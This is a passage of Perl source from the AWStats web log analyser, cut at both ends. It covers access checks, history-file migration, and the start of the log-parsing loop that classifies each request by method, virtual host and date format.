	if ( !$allowaccess ) {
		error( "Access to statistics is not allowed from your IP Address "
			  . $ENV{"REMOTE_ADDR"} );
	}
}
if (   ( $UpdateStats || $MigrateStats )
	&& ( !$AllowToUpdateStatsFromBrowser )
	&& $ENV{'GATEWAY_INTERFACE'} )
{
	error(  ""
		  . ( $UpdateStats ? "Update" : "Migrate" )
		  . " of statistics has not been allowed from a browser (AllowToUpdateStatsFromBrowser should be set to 1)."
	);
}
if ( scalar keys %HTMLOutput && $MonthRequired eq 'all' ) {
	if ( !$AllowFullYearView ) {
		error(
"Full year view has not been allowed (AllowFullYearView is set to 0)."
		);
	}
	if ( $AllowFullYearView < 3 && $ENV{'GATEWAY_INTERFACE'} ) {
		error(
"Full year view has not been allowed from a browser (AllowFullYearView should be set to 3)."
		);
	}
}

#------------------------------------------
# MIGRATE PROCESS (Must be after reading config cause we need MaxNbOf... and Min...)
#------------------------------------------
if ($MigrateStats) {
	if ($Debug) { debug( "MigrateStats is $MigrateStats", 2 ); }
	if ( $MigrateStats !~
		/^(.*)$PROG(\d\d)(\d\d\d\d)(\d{0,2})(\d{0,2})(.*)\.txt$/ )
	{
		error(
"AWStats history file name must match following syntax: ${PROG}MMYYYY[.config].txt",
			"", "", 1
		);
	}
	$DirData       = "$1";
	$MonthRequired = "$2";
	$YearRequired  = "$3";
	$DayRequired   = "$4";
	$HourRequired  = "$5";
	$FileSuffix    = "$6";

	# Correct DirData
	if ( !$DirData || $DirData =~ /^\./ ) {
		if ( !$DirData || $DirData eq '.' ) {
			$DirData = "$DIR";
		}    # If not defined or chosen to '.' value then DirData is current dir
		elsif ( $DIR && $DIR ne '.' ) { $DirData = "$DIR/$DirData"; }
	}
	$DirData ||= '.';    # If current dir not defined then we put it to '.'
	$DirData =~ s/[\\\/]+$//;
	print "Start migration for file '$MigrateStats'.";
	print $ENV{'GATEWAY_INTERFACE'} ? "<br />\n" : "\n";
	if ($EnableLockForUpdate) { &Lock_Update(1); }
	my $newhistory =
	  &Read_History_With_TmpUpdate( $YearRequired, $MonthRequired, $DayRequired,
		$HourRequired, 1, 0, 'all' );
	if ( rename( "$newhistory", "$MigrateStats" ) == 0 ) {
		unlink "$newhistory";
		error(
"Failed to rename \"$newhistory\" into \"$MigrateStats\".\nWrite permissions on \"$MigrateStats\" might be wrong"
			  . (
				$ENV{'GATEWAY_INTERFACE'} ? " for a 'migration from web'" : ""
			  )
			  . " or file might be opened."
		);
	}
	if ($EnableLockForUpdate) { &Lock_Update(0); }
	print "Migration for file '$MigrateStats' successful.";
	print $ENV{'GATEWAY_INTERFACE'} ? "<br />\n" : "\n";
	&html_end(1);
	exit 0;
}

# Output main frame page and exit. This must be after the security check.
if ( $FrameName eq 'index' ) {

	# Define the NewLinkParams for main chart
	my $NewLinkParams = ${QueryString};
	$NewLinkParams =~ s/(^|&|&amp;)framename=[^&]*//i;
	$NewLinkParams =~ s/(&amp;|&)+/&amp;/i;
	$NewLinkParams =~ s/^&amp;//;
	$NewLinkParams =~ s/&amp;$//;
	if ($NewLinkParams) { $NewLinkParams = "${NewLinkParams}&amp;"; }

	# Exit if main frame
	print "<frameset cols=\"$FRAMEWIDTH,*\">\n";
	print "<frame name=\"mainleft\" src=\""
	  . XMLEncode("$AWScript${NewLinkParams}framename=mainleft")
	  . "\" noresize=\"noresize\" frameborder=\"0\" />\n";
	print "<frame name=\"mainright\" src=\""
	  . XMLEncode("$AWScript${NewLinkParams}framename=mainright")
	  . "\" noresize=\"noresize\" scrolling=\"yes\" frameborder=\"0\" />\n";
	print "<noframes><body>";
	print "Your browser does not support frames.<br />\n";
	print "You must set AWStats UseFramesWhenCGI parameter to 0\n";
	print "to see your reports.<br />\n";
	print "</body></noframes>\n";
	print "</frameset>\n";
	&html_end(0);
	exit 0;
}

%MonthNumLib = (
	"01", _t("month_01"), "02", _t("month_02"), "03", _t("month_03"),
	"04", _t("month_04"), "05", _t("month_05"), "06", _t("month_06"),
	"07", _t("month_07"), "08", _t("month_08"), "09", _t("month_09"),
	"10", _t("month_10"), "11", _t("month_11"), "12", _t("month_12")
);

# Build ListOfYears list with all existing years
(
	$lastyearbeforeupdate, $lastmonthbeforeupdate, $lastdaybeforeupdate,
	$lasthourbeforeupdate, $lastdatebeforeupdate
  )
  = ( 0, 0, 0, 0, 0 );
my $datemask = '';
if    ( $DatabaseBreak eq 'month' ) { $datemask = '(\d\d)(\d\d\d\d)'; }
elsif ( $DatabaseBreak eq 'year' )  { $datemask = '(\d\d\d\d)'; }
elsif ( $DatabaseBreak eq 'day' )   { $datemask = '(\d\d)(\d\d\d\d)(\d\d)'; }
elsif ( $DatabaseBreak eq 'hour' )  {
	$datemask = '(\d\d)(\d\d\d\d)(\d\d)(\d\d)';
}

if ($Debug) {
	debug(
"Scan for last history files into DirData='$DirData' with mask='$datemask'"
	);
}

my $retval = opendir( DIR, "$DirData" );
if(! $retval) 
{
    error( "Failed to open directory $DirData : $!");
}
my $regfilesuffix = quotemeta($FileSuffix);
foreach ( grep /^$PROG$datemask$regfilesuffix\.txt(|\.gz)$/i,
	file_filt sort readdir DIR )
{
	/^$PROG$datemask$regfilesuffix\.txt(|\.gz)$/i;
	if ( !$ListOfYears{"$2"} || "$1" gt $ListOfYears{"$2"} ) {

		# ListOfYears contains max month found
		$ListOfYears{"$2"} = "$1";
	}
	my $rangestring = ( $2 || "" ) . ( $1 || "" ) . ( $3 || "" ) . ( $4 || "" );
	if ( $rangestring gt $lastdatebeforeupdate ) {

		# We are on a new max for mask
		$lastyearbeforeupdate  = ( $2 || "" );
		$lastmonthbeforeupdate = ( $1 || "" );
		$lastdaybeforeupdate   = ( $3 || "" );
		$lasthourbeforeupdate  = ( $4 || "" );
		$lastdatebeforeupdate = $rangestring;
	}
}
close DIR;

# If at least one file found, get value for LastLine
if ($lastyearbeforeupdate) {

	# Read 'general' section of last history file for LastLine
	&Read_History_With_TmpUpdate( $lastyearbeforeupdate, $lastmonthbeforeupdate,
		$lastdaybeforeupdate, $lasthourbeforeupdate, 0, 0, "general" );
}

# Warning if lastline in future
if ( $LastLine > ( $nowtime + 20000 ) ) {
	warning(
"WARNING: LastLine parameter in history file is '$LastLine' so in future. May be you need to correct manually the line LastLine in some awstats*.$SiteConfig.conf files."
	);
}

# Force LastLine
if ( $QueryString =~ /lastline=(\d{14})/i ) {
	$LastLine = $1;
}
if ($Debug) {
	debug("Last year=$lastyearbeforeupdate - Last month=$lastmonthbeforeupdate");
	debug("Last day=$lastdaybeforeupdate - Last hour=$lasthourbeforeupdate");
	debug("LastLine=$LastLine");
	debug("LastLineNumber=$LastLineNumber");
	debug("LastLineOffset=$LastLineOffset");
	debug("LastLineChecksum=$LastLineChecksum");
}

# Init vars
&Init_HashArray();

#------------------------------------------
# UPDATE PROCESS
#------------------------------------------
my $lastlinenb         = 0;
my $lastlineoffset     = 0;
my $lastlineoffsetnext = 0;
if ($Debug) { debug( "UpdateStats is $UpdateStats", 2 ); }
if ( $UpdateStats && $FrameName ne 'index' && $FrameName ne 'mainleft' )
{    # Update only on index page or when not framed to avoid update twice

	my %MonthNum = (
		"Jan", "01", "jan", "01", "Feb", "02", "feb", "02", "Mar", "03",
		"mar", "03", "Apr", "04", "apr", "04", "May", "05", "may", "05",
		"Jun", "06", "jun", "06", "Jul", "07", "jul", "07", "Aug", "08",
		"aug", "08", "Sep", "09", "sep", "09", "Oct", "10", "oct", "10",
		"Nov", "11", "nov", "11", "Dec", "12", "dec", "12"
	  )
	  ; # MonthNum must be in english because used to translate log date in apache log files

	if ( !scalar keys %HTMLOutput ) {
		print
"Create/Update database for config \"$FileConfig\" by AWStats version $VERSION\n";
		print "From data in log file \"$LogFile\"...\n";
	}

	my $lastprocessedyear  = $lastyearbeforeupdate  || 0;
	my $lastprocessedmonth = $lastmonthbeforeupdate || 0;
	my $lastprocessedday   = $lastdaybeforeupdate   || 0;
	my $lastprocessedhour  = $lasthourbeforeupdate  || 0;
	my $lastprocesseddate  = '';
	if ( $DatabaseBreak eq 'month' ) {
		$lastprocesseddate =
		  sprintf( "%04i%02i", $lastprocessedyear, $lastprocessedmonth );
	}
	elsif ( $DatabaseBreak eq 'year' ) {
		$lastprocesseddate = sprintf( "%04i%", $lastprocessedyear );
	}
	elsif ( $DatabaseBreak eq 'day' ) {
		$lastprocesseddate = sprintf( "%04i%02i%02i",
			$lastprocessedyear, $lastprocessedmonth, $lastprocessedday );
	}
	elsif ( $DatabaseBreak eq 'hour' ) {
		$lastprocesseddate = sprintf(
			"%04i%02i%02i%02i",
			$lastprocessedyear, $lastprocessedmonth,
			$lastprocessedday,  $lastprocessedhour
		);
	}

	my @list;

	# Init RobotsSearchIDOrder required for update process
	@list = ();
	if ( $LevelForRobotsDetection >= 1 ) {
		foreach ( 1 .. $LevelForRobotsDetection ) { push @list, "list$_"; }
		push @list, "listgen";    # Always added
	}
	foreach my $key (@list) {
		push @RobotsSearchIDOrder, @{"RobotsSearchIDOrder_$key"};
		if ($Debug) {
			debug(
				"Add "
				  . @{"RobotsSearchIDOrder_$key"}
				  . " elements from RobotsSearchIDOrder_$key into RobotsSearchIDOrder",
				2
			);
		}
	}
	if ($Debug) {
		debug(
			"RobotsSearchIDOrder has now " . @RobotsSearchIDOrder . " elements",
			1
		);
	}

	# Init SearchEnginesIDOrder required for update process
	@list = ();
	if ( $LevelForSearchEnginesDetection >= 1 ) {
		foreach ( 1 .. $LevelForSearchEnginesDetection ) {
			push @list, "list$_";
		}
		push @list, "listgen";    # Always added
	}
	foreach my $key (@list) {
		push @SearchEnginesSearchIDOrder, @{"SearchEnginesSearchIDOrder_$key"};
		if ($Debug) {
			debug(
				"Add "
				  . @{"SearchEnginesSearchIDOrder_$key"}
				  . " elements from SearchEnginesSearchIDOrder_$key into SearchEnginesSearchIDOrder",
				2
			);
		}
	}
	if ($Debug) {
		debug(
			"SearchEnginesSearchIDOrder has now "
			  . @SearchEnginesSearchIDOrder
			  . " elements",
			1
		);
	}

	# Complete HostAliases array
	my $sitetoanalyze = quotemeta( lc($SiteDomain) );
	if ( !@HostAliases ) {
		warning(
"Warning: HostAliases parameter is not defined, $PROG choose \"$SiteDomain localhost 127.0.0.1\"."
		);
		push @HostAliases, qr/^$sitetoanalyze$/i;
		push @HostAliases, qr/^localhost$/i;
		push @HostAliases, qr/^127\.0\.0\.1$/i;
	}
	else {
		unshift @HostAliases, qr/^$sitetoanalyze$/i;
	}    # Add SiteDomain as first value

	# Optimize arrays
	@HostAliases = &OptimizeArray( \@HostAliases, 1 );
	if ($Debug) {
		debug( "HostAliases precompiled regex list is now @HostAliases", 1 );
	}
	@SkipDNSLookupFor = &OptimizeArray( \@SkipDNSLookupFor, 1 );
	if ($Debug) {
		debug(
			"SkipDNSLookupFor precompiled regex list is now @SkipDNSLookupFor",
			1
		);
	}
	@SkipHosts = &OptimizeArray( \@SkipHosts, 1 );
	if ($Debug) {
		debug( "SkipHosts precompiled regex list is now @SkipHosts", 1 );
	}
	@SkipReferrers = &OptimizeArray( \@SkipReferrers, 1 );
	if ($Debug) {
		debug( "SkipReferrers precompiled regex list is now @SkipReferrers",
			1 );
	}
	@SkipUserAgents = &OptimizeArray( \@SkipUserAgents, 1 );
	if ($Debug) {
		debug( "SkipUserAgents precompiled regex list is now @SkipUserAgents",
			1 );
	}
	@SkipFiles = &OptimizeArray( \@SkipFiles, $URLNotCaseSensitive );
	if ($Debug) {
		debug( "SkipFiles precompiled regex list is now @SkipFiles", 1 );
	}
	@OnlyHosts = &OptimizeArray( \@OnlyHosts, 1 );
	if ($Debug) {
		debug( "OnlyHosts precompiled regex list is now @OnlyHosts", 1 );
	}
	@OnlyUsers = &OptimizeArray( \@OnlyUsers, 1 );
	if ($Debug) {
		debug( "OnlyUsers precompiled regex list is now @OnlyUsers", 1 );
	}
	@OnlyUserAgents = &OptimizeArray( \@OnlyUserAgents, 1 );
	if ($Debug) {
		debug( "OnlyUserAgents precompiled regex list is now @OnlyUserAgents",
			1 );
	}
	@OnlyFiles = &OptimizeArray( \@OnlyFiles, $URLNotCaseSensitive );
	if ($Debug) {
		debug( "OnlyFiles precompiled regex list is now @OnlyFiles", 1 );
	}
	@NotPageFiles = &OptimizeArray( \@NotPageFiles, $URLNotCaseSensitive );
	if ($Debug) {
		debug( "NotPageFiles precompiled regex list is now @NotPageFiles", 1 );
	}

	# Precompile the regex search strings with qr
	@RobotsSearchIDOrder        = map { qr/$_/i } @RobotsSearchIDOrder;
	@WormsSearchIDOrder         = map { qr/$_/i } @WormsSearchIDOrder;
	@BrowsersSearchIDOrder      = map { qr/$_/i } @BrowsersSearchIDOrder;
	@OSSearchIDOrder            = map { qr/$_/i } @OSSearchIDOrder;
	@SearchEnginesSearchIDOrder = map { qr/$_/i } @SearchEnginesSearchIDOrder;
	my $miscquoted     = quotemeta("$MiscTrackerUrl");
	my $defquoted      = quotemeta("/$DefaultFile[0]");
	my $sitewithoutwww = lc($SiteDomain);
	$sitewithoutwww =~ s/www\.//;
	$sitewithoutwww = quotemeta($sitewithoutwww);

	# Define precompiled regex
	my $regmisc        = qr/^$miscquoted/;
	my $regfavico      = qr/\/favicon\.ico$/i;
	my $regrobot       = qr/\/robots\.txt$/i;
	my $regtruncanchor = qr/#(\w*)$/;
	my $regtruncurl    = qr/([$URLQuerySeparators])(.*)$/;
	my $regext         = qr/\.(\w{1,6})$/;
	my $regdefault;
	if ($URLNotCaseSensitive) { $regdefault = qr/$defquoted$/i; }
	else { $regdefault = qr/$defquoted$/; }
	my $regipv4           = qr/^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/;
	my $regipv4l          = qr/^::ffff:\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/;
	my $regipv6           = qr/^[0-9A-F]*:/i;
	my $regveredge        = qr/edge\/([\d]+)/i;
	my $regvermsie        = qr/msie([+_ ]|)([\d\.]*)/i;
	#my $regvermsie11      = qr/trident\/7\.\d*\;([+_ ]|)rv:([\d\.]*)/i;
	my $regvermsie11      = qr/trident\/7\.\d*\;([a-zA-Z;+_ ]+|)rv:([\d\.]*)/i;
	my $regvernetscape    = qr/netscape.?\/([\d\.]*)/i;
	my $regverfirefox     = qr/firefox\/([\d\.]*)/i;
	# For Opera:
	# OPR/15.0.1266 means Opera 15 
	# Opera/9.80 ...... Version/12.16 means Opera 12.16
	# Mozilla/5.0 .... Opera 11.51 means Opera 11.51
	my $regveropera = qr/opera\/9\.80\s.+\sversion\/([\d\.]+)|ope?ra?[\/\s]([\d\.]+)/i;
	my $regversafari      = qr/safari\/([\d\.]*)/i;
	my $regversafariver   = qr/version\/([\d\.]*)/i;
	my $regverchrome      = qr/chrome\/([\d\.]*)/i;
	my $regverkonqueror   = qr/konqueror\/([\d\.]*)/i;
	my $regversvn         = qr/svn\/([\d\.]*)/i;
	my $regvermozilla     = qr/mozilla(\/|)([\d\.]*)/i;
	my $regnotie          = qr/webtv|omniweb|opera/i;
	my $regnotnetscape    = qr/gecko|compatible|opera|galeon|safari|charon/i;
	my $regnotfirefox     = qr/flock/i;
	my $regnotsafari      = qr/android|arora|chrome|shiira|webpositive/i;
	my $regreferer        = qr/^(\w+):\/\/([^\/:]+)(:\d+|)/;
	my $regreferernoquery = qr/^([^$URLQuerySeparators]+)/;
	my $reglocal          = qr/^(www\.|)$sitewithoutwww/i;
	my $regget            = qr/get|out/i;
	my $regsent           = qr/sent|put|in/i;

	# Define value of $pos_xxx, @fieldlib, $PerlParsingFormat
	&DefinePerlParsingFormat($LogFormat);

	# Load DNS Cache Files
	#------------------------------------------
	if ($DNSLookup) {
		&Read_DNS_Cache( \%MyDNSTable, "$DNSStaticCacheFile", "", 1 )
		  ; # Load with save into a second plugin file if plugin enabled and second file not up to date. No use of FileSuffix
		if ( $DNSLookup == 1 ) {    # System DNS lookup required
			 #if (! eval("use Socket;")) { error("Failed to load perl module Socket."); }
			 #use Socket;
			&Read_DNS_Cache( \%TmpDNSLookup, "$DNSLastUpdateCacheFile",
				"$FileSuffix", 0 )
			  ;    # Load with no save into a second plugin file. Use FileSuffix
		}
	}

	# Processing log
	#------------------------------------------

	if ($EnableLockForUpdate) {

		# Trap signals to remove lock
		$SIG{INT} = \&SigHandler;    # 2
		                             #$SIG{KILL} = \&SigHandler;	# 9
		                             #$SIG{TERM} = \&SigHandler;	# 15
		                             # Set AWStats update lock
		&Lock_Update(1);
	}

	if ($Debug) {
		debug("Start Update process (lastprocesseddate=$lastprocesseddate)");
	}

	# Open log file
	if ($Debug) { debug("Open log file \"$LogFile\""); }
	open( LOG, "$LogFile" )
	  || error("Couldn't open server log file \"$LogFile\" : $!");
	binmode LOG
	  ;   # Avoid premature EOF due to log files corrupted with \cZ or bin chars

	# Define local variables for loop scan
	my @field               = ();
	my $counterforflushtest = 0;
	my $qualifdrop          = '';
	my $countedtraffic      = 0;

	# Reset chrono for benchmark (first call to GetDelaySinceStart)
	&GetDelaySinceStart(1);
	if ( !scalar keys %HTMLOutput ) {
		print "Phase 1 : First bypass old records, searching new record...\n";
	}

	# Can we try a direct seek access in log ?
	my $line;
	if ( $LastLine && $LastLineNumber && $LastLineOffset && $LastLineChecksum )
	{

		# Try a direct seek access to save time
		if ($Debug) {
			debug(
"Try a direct access to LastLine=$LastLine, LastLineNumber=$LastLineNumber, LastLineOffset=$LastLineOffset, LastLineChecksum=$LastLineChecksum"
			);
		}
		seek( LOG, $LastLineOffset, 0 );
		if ( $line = <LOG> ) {
			chomp $line;
			$line =~ s/\r$//;
			@field = map( /$PerlParsingFormat/, $line );
			if ($Debug) {
				my $string = '';
				foreach ( 0 .. @field - 1 ) {
					$string .= "$fieldlib[$_]=$field[$_] ";
				}
				if ($Debug) {
					debug( " Read line after direct access: $string", 1 );
				}
			}
			my $checksum = &CheckSum($line);
			if ($Debug) {
				debug(
" LastLineChecksum=$LastLineChecksum, Read line checksum=$checksum",
					1
				);
			}
			if ( $checksum == $LastLineChecksum ) {
				if ( !scalar keys %HTMLOutput ) {
					print
"Direct access after last parsed record (after line $LastLineNumber)\n";
				}
				$lastlinenb         = $LastLineNumber;
				$lastlineoffset     = $LastLineOffset;
				$lastlineoffsetnext = tell LOG;
				$NewLinePhase       = 1;
			}
			else {
				if ( !scalar keys %HTMLOutput ) {
					print
"Direct access to last remembered record has fallen on another record.\nSo searching new records from beginning of log file...\n";
				}
				$lastlinenb         = 0;
				$lastlineoffset     = 0;
				$lastlineoffsetnext = 0;
				seek( LOG, 0, 0 );
			}
		}
		else {
			if ( !scalar keys %HTMLOutput ) {
				print
"Direct access to last remembered record is out of file.\nSo searching it from beginning of log file...\n";
			}
			$lastlinenb         = 0;
			$lastlineoffset     = 0;
			$lastlineoffsetnext = 0;
			seek( LOG, 0, 0 );
		}
	}
	else {

		# No try of direct seek access
		if ( !scalar keys %HTMLOutput ) {
			print "Searching new records from beginning of log file...\n";
		}
		$lastlinenb         = 0;
		$lastlineoffset     = 0;
		$lastlineoffsetnext = 0;
	}

	#
	# Loop on each log line
	#
	while ( $line = <LOG> ) {
		
		# 20080525 BEGIN Patch to test if first char of $line = hex "00" then conclude corrupted with binary code
		my $FirstHexChar;
		$FirstHexChar = sprintf( "%02X", ord( substr( $line, 0, 1 ) ) );
		if ( $FirstHexChar eq '00' ) {
			$NbOfLinesCorrupted++;
			if ($ShowCorrupted) {
				print "Corrupted record line "
				  . ( $lastlinenb + $NbOfLinesParsed )
				  . " (record starts with hex 00; binary code): $line\n";
			}
			if (   $NbOfLinesParsed >= $NbOfLinesForCorruptedLog
				&& $NbOfLinesParsed == $NbOfLinesCorrupted )
			{
				error( "Format error", $line, $LogFile );
			}    # Exit with format error
			next;
		}
		# 20080525 END

		chomp $line;
		$line =~ s/\r$//;
		if ( $UpdateFor && $NbOfLinesParsed >= $UpdateFor ) { last; }
		$NbOfLinesParsed++;

		$lastlineoffset     = $lastlineoffsetnext;
		$lastlineoffsetnext = tell LOG;

		if ($ShowSteps) {
			if ( ( ++$NbOfLinesShowsteps & $NBOFLINESFORBENCHMARK ) == 0 ) {
				my $delay = &GetDelaySinceStart(0);
				print "$NbOfLinesParsed lines processed ("
				  . ( $delay > 0 ? $delay : 1000 ) . " ms, "
				  . int(
					1000 * $NbOfLinesShowsteps / ( $delay > 0 ? $delay : 1000 )
				  )
				  . " lines/second)\n";
			}
		}

		if ( $LogFormat eq '2' && $line =~ /^#Fields:/ ) {
			my @fixField = map( /^#Fields: (.*)/, $line );
			if ( $fixField[0] !~ /s-kernel-time/ ) {
				debug( "Found new log format: '" . $fixField[0] . "'", 1 );
				&DefinePerlParsingFormat( $fixField[0] );
			}
		}

		# Parse line record to get all required fields
		my $json_error = undef;
		if (defined $PerlParsingFormatJsonMap) {
			my $json = undef;
			try {
				$json = JSON::XS->new->utf8->decode($line);
			}
			catch {
				my $err = shift;
				$json_error = $err;
				$json_error =~ s/^\s+|\s+$//g;
			};
			@field = ();
			if ($json) {
				for my $el (@fieldlib) {
					my $json_key = ${$PerlParsingFormatJsonMap}{$el};
					push(@field, ${$json}{$json_key});
				}
			}
        } else {
            @field = map( /$PerlParsingFormat/, $line );
        }
		if ( !@field ) {
			# see if the line is a comment, blank or corrupted
 			if ( $line =~ /^#/ || $line =~ /^!/ ) {
				$NbOfLinesComment++;
				if ($ShowCorrupted){
					print "Comment record line "
					  . ( $lastlinenb + $NbOfLinesParsed )
					  . ": $line\n";
				}
 			}
 			elsif ( $line =~ /^\s*$/ ) {
 				$NbOfLinesBlank++;
				if ($ShowCorrupted){
					print "Blank record line "
					  . ( $lastlinenb + $NbOfLinesParsed )
					  . "\n";
				}
 			}else{
 				$NbOfLinesCorrupted++;
 				if ($ShowCorrupted){
                    my $err = $json_error ? $json_error : "record format does not match LogFormat parameter";
 				print "Corrupted record line "
  					  . ( $lastlinenb + $NbOfLinesParsed )
                      . " ($err): $line\n";
  				}
			}
			if (   $NbOfLinesParsed >= $NbOfLinesForCorruptedLog
				&& $NbOfLinesParsed == ($NbOfLinesCorrupted + $NbOfLinesComment + $NbOfLinesBlank))
			{
				error( "Format error", $line, $LogFile );
			}    # Exit with format error
			if ( $line =~ /^__end_of_file__/i ) { last; } # For test purpose only
			next;
		}

		if ($Debug) {
			my $string = '';
			foreach ( 0 .. @field - 1 ) {
				$string .= "$fieldlib[$_]=$field[$_] ";
			}
			if ($Debug) {
				debug(
					" Correct format line "
					  . ( $lastlinenb + $NbOfLinesParsed )
					  . ": $string",
					4
				);
			}
		}

		# Drop wrong virtual host name
		#----------------------------------------------------------------------
		if ( $pos_vh >= 0 && $field[$pos_vh] !~ /^$SiteDomain$/i ) {
			my $skip = 1;
			foreach (@HostAliases) {
				if ( $field[$pos_vh] =~ /$_/ ) { $skip = 0; last; }
			}
			if ($skip) {
				$NbOfLinesDropped++;
				if ($ShowDropped) {
					print
"Dropped record (virtual hostname '$field[$pos_vh]' does not match SiteDomain='$SiteDomain' nor HostAliases parameters): $line\n";
				}
				next;
			}
		}

		# Drop wrong method/protocol
		#---------------------------
		if ( $LogType ne 'M' ) { $field[$pos_url] =~ s/\s/%20/g; }
		if (
			$LogType eq 'W'
			&& (
				   $field[$pos_method] eq 'GET'
				|| $field[$pos_method] eq 'POST'
				|| $field[$pos_method] eq 'HEAD'
				|| $field[$pos_method] eq 'PROPFIND'
				|| $field[$pos_method] eq 'CHECKOUT'
				|| $field[$pos_method] eq 'LOCK'
				|| $field[$pos_method] eq 'PROPPATCH'
				|| $field[$pos_method] eq 'OPTIONS'
				|| $field[$pos_method] eq 'MKACTIVITY'
				|| $field[$pos_method] eq 'PUT'
				|| $field[$pos_method] eq 'MERGE'
				|| $field[$pos_method] eq 'DELETE'
				|| $field[$pos_method] eq 'REPORT'
				|| $field[$pos_method] eq 'MKCOL'
				|| $field[$pos_method] eq 'COPY'
				|| $field[$pos_method] eq 'RPC_IN_DATA'
				|| $field[$pos_method] eq 'RPC_OUT_DATA'
				|| $field[$pos_method] eq 'OK'             # Webstar
				|| $field[$pos_method] eq 'ERR!'           # Webstar
				|| $field[$pos_method] eq 'PRIV'           # Webstar
			)
		  )
		{

# HTTP request.	Keep only GET, POST, HEAD, *OK* and ERR! for Webstar. Do not keep OPTIONS, TRACE
		}
		elsif (
			( $LogType eq 'W' || $LogType eq 'S' )
			&& (   uc($field[$pos_method]) eq 'GET'
				|| uc($field[$pos_method]) eq 'MMS'
				|| uc($field[$pos_method]) eq 'RTSP'
				|| uc($field[$pos_method]) eq 'HTTP'
				|| uc($field[$pos_method]) eq 'RTP' )
		  )
		{

# Streaming request (windows media server, realmedia or darwin streaming server)
		}
		elsif ( $LogType eq 'M' && $field[$pos_method] eq 'SMTP' ) {

		# Mail request ('SMTP' for mail log with maillogconvert.pl preprocessor)
		}
		elsif (
			$LogType eq 'F'
			&& (   $field[$pos_method] eq 'RETR'
				|| $field[$pos_method] eq 'D'
				|| $field[$pos_method] eq 'o'
				|| $field[$pos_method] =~ /$regget/o )
		  )
		{

			# FTP GET request
		}
		elsif (
			$LogType eq 'F'
			&& (   $field[$pos_method] eq 'STOR'
				|| $field[$pos_method] eq 'U'
				|| $field[$pos_method] eq 'i'
				|| $field[$pos_method] =~ /$regsent/o )
		  )
		{

			# FTP SENT request
		}
		elsif($line =~ m/#Fields:/){
 			# log #fields as comment
 			$NbOfLinesComment++;
 			next;			
 		}else{
			$NbOfLinesDropped++;
			if ($ShowDropped) {
				print
"Dropped record (method/protocol '$field[$pos_method]' not qualified when LogType=$LogType): $line\n";
			}
			next;
		}

		# Reformat date for IIS date -DWG 12/8/2008
		if($field[$pos_date] =~ /,/)
		{
			$field[$pos_date] =~ s/,//;
			my @split_date = split(' ',$field[$pos_date]);
			my @dateparts2= split('/',$split_date[0]);
			my @timeparts2= split(':',$split_date[1]);
			#add leading zero
			for($dateparts2[0],$dateparts2[1], $timeparts2[0], $timeparts2[1],  $timeparts2[2])			{
				if($_ =~ /^.$/)
				{
					$_ = '0'.$_;
				}

			}

			$field[$pos_date] = "$dateparts2[2]-$dateparts2[0]-$dateparts2[1] $timeparts2[0]:$timeparts2[1]:$timeparts2[2]";
		}
		
		$field[$pos_date] =~
		  tr/,-\/ \tT/::::::/s;  # " \t" is used instead of "\s" not known with tr
		my @dateparts =
		  split( /:/, $field[$pos_date] ); # tr and split faster than @dateparts=split(/[\/\-:\s]/,$field[$pos_date])
		 # Detected date format: 
		 # dddddddddd, YYYY-MM-DD HH:MM:SS (IIS), MM/DD/YY\tHH:MM:SS,
		 # DD/Month/YYYY:HH:MM:SS (Apache), DD/MM/YYYY HH:MM:SS, Mon DD HH:MM:SS,
		 # YYYY-MM-DDTHH:MM:SS (iso)
		if ( !$dateparts[1] ) {    # Unix timestamp
			(
				$dateparts[5], $dateparts[4], $dateparts[3],
				$dateparts[0], $dateparts[1], $dateparts[2]
			  )
			  = localtime( int( $field[$pos_date] ) );
			$dateparts[1]++;
			$dateparts[2] += 1900;
		}
		elsif ( $dateparts[0] =~ /^....$/ ) {
			my $tmp = $dateparts[0];
			$dateparts[0] = $dateparts[2];
			$dateparts[2] = $tmp;
		}
		elsif ( $field[$pos_date] =~ /^..:..:..:/ ) {
			$dateparts[2] += 2000;
			my $tmp = $dateparts[0];
			$dateparts[0] = $dateparts[1];
			$dateparts[1] = $tmp;
		}
		elsif ( $dateparts[0] =~ /^...$/ ) {
			my $tmp = $dateparts[0];
			$dateparts[0] = $dateparts[1];
			$dateparts[1] = $tmp;
			$tmp          = $dateparts[5];
			$dateparts[5] = $dateparts[4];
			$dateparts[4] = $dateparts[3];
			$dateparts[3] = $dateparts[2];
			$dateparts[2] = $tmp || $nowyear;
		}
		if ( exists( $MonthNum{ $dateparts[1] } ) ) {
			$dateparts[1] = $MonthNum{ $dateparts[1] };
		}    # Change lib month in num month if necessary
		if ( $dateparts[1] <= 0 )
		{ # Date corrupted (for example $dateparts[1]='dic' for december month in a spanish log file)
			$NbOfLinesCorrupted++;
			if ($ShowCorrupted) {
				print "Corrupted record line "
				  . ( $lastlinenb + $NbOfLinesParsed )
				  . " (bad date format for month, may be month are not in english ?): $line\n";
			}
			next;
		}

# Now @dateparts is (DD,MM,YYYY,HH,MM,SS) and we're going to create $timerecord=YYYYMMDDHHMMSS
		if ( $PluginsLoaded{'ChangeTime'}{'timezone'} ) {
			@dateparts = ChangeTime_timezone( \@dateparts );
		}
		my $yearrecord  = int( $dateparts[2] );
		my $monthrecord = int( $dateparts[1] );
		my $dayrecord   = int( $dateparts[0] );
		my $hourrecord  = int( $dateparts[3] );
		my $daterecord  = '';
		if ( $DatabaseBreak eq 'month' ) {
			$daterecord = sprintf( "%04i%02i", $yearrecord, $monthrecord );
		}
		elsif ( $DatabaseBreak eq 'year' ) {
			$daterecord = sprintf( "%04i%", $yearrecord );
		}
		elsif ( $DatabaseBreak eq 'day' ) {
			$daterecord =
			  sprintf( "%04i%02i%02i", $yearrecord, $monthrecord, $dayrecord );
		}
		elsif ( $DatabaseBreak eq 'hour' ) {
			$daterecord = sprintf( "%04i%02i%02i%02i",
				$yearrecord, $monthrecord, $dayrecord, $hourrecord );
		}

		# TODO essayer de virer yearmonthrecord
		my $yearmonthdayrecord =
		  sprintf( "$dateparts[2]%02i%02i", $dateparts[1], $dateparts[0] );
		my $timerecord =
		  ( ( int("$yearmonthdayrecord") * 100 + $dateparts[3] ) * 100 +
			  $dateparts[4] ) * 100 + $dateparts[5];

		# Check date
		#-----------------------
		if ( $LogType eq 'M' && $timerecord > $tomorrowtime ) {

# Postfix/Sendmail does not store year, so we assume that year is year-1 if record is in future
			$yearrecord--;
			if ( $DatabaseBreak eq 'month' ) {
				$daterecord = sprintf( "%04i%02i", $yearrecord, $monthrecord );
			}
			elsif ( $DatabaseBreak eq 'year' ) {
